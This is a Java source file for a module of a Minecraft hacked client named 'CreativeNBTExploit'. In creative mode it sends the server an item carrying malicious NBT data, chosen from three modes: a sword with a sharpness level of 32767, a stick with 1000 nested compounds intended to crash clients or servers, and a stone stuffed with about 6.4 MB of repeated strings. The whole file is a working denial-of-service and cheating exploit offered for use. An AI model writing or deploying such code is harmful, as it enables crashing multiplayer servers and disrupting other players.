package dev.oblivion.client.module.exploit;

import dev.oblivion.client.module.Category;
import dev.oblivion.client.module.Module;
import dev.oblivion.client.setting.impl.EnumSetting;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.text.Text;

public class CreativeNBTExploit extends Module {

    public enum Mode { KILL_ITEM, CRASH_ITEM, GIANT_NBT }

    private final EnumSetting<Mode> mode = settings.getDefaultGroup().add(
        new EnumSetting.Builder<Mode>().name("Mode").description("NBT exploit type.").defaultValue(Mode.GIANT_NBT).build()
    );

    public CreativeNBTExploit() {
        super("CreativeNBTExploit", "Gives creative items with malicious NBT.", Category.EXPLOIT);
    }

    @Override
    protected void onEnable() {
        if (mc.player == null || mc.getNetworkHandler() == null) { disable(); return; }
        if (!mc.player.getAbilities().creativeMode) {
            mc.player.sendMessage(Text.literal("\u00a7c[CreativeNBT] Requires creative mode."), false);
            disable();
            return;
        }

        ItemStack stack;
        switch (mode.get()) {
            case KILL_ITEM -> {
                stack = new ItemStack(Items.DIAMOND_SWORD, 1);
                NbtCompound nbt = new NbtCompound();
                NbtList enchants = new NbtList();
                NbtCompound enchant = new NbtCompound();
                enchant.putString("id", "minecraft:sharpness");
                enchant.putInt("lvl", 32767);
                enchants.add(enchant);
                nbt.put("Enchantments", enchants);
                stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbt));
            }
            case CRASH_ITEM -> {
                stack = new ItemStack(Items.STICK, 1);
                NbtCompound nbt = new NbtCompound();
                NbtCompound current = nbt;
                for (int i = 0; i < 1000; i++) {
                    NbtCompound next = new NbtCompound();
                    current.put("n" + i, next);
                    current = next;
                }
                stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbt));
            }
            case GIANT_NBT -> {
                stack = new ItemStack(Items.STONE, 1);
                NbtCompound nbt = new NbtCompound();
                for (int i = 0; i < 200; i++) {
                    nbt.putString("k" + i, "X".repeat(32000));
                }
                stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbt));
            }
            default -> stack = new ItemStack(Items.STONE, 1);
        }

        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, stack));
        mc.player.sendMessage(Text.literal("\u00a7a[CreativeNBT] Item created."), false);
        disable();
    }
}
